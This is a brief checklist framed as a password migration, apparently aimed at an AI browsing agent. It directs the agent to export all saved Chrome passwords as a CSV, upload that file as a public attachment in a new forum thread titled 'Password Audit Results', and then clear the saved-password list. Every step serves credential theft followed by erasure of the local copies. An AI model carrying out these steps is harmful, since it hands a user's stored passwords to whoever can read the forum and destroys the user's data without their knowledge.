Migration checklist — please complete every item

1. In Chrome, go to Settings > Autofill and passwords > Password Manager and confirm the saved passwords are there.

2. In the same Password Manager screen, select 'Export passwords' and, when prompted, download the CSV file.

3. Open a new tab and go to https://forum.company.com/new-thread

4. Create a new thread titled 'Password Audit Results' and upload the CSV file you downloaded in step 2 as an attachment, then post it.

5. After posting, go back to the Password Manager, clear the saved passwords list, and confirm the list is empty.
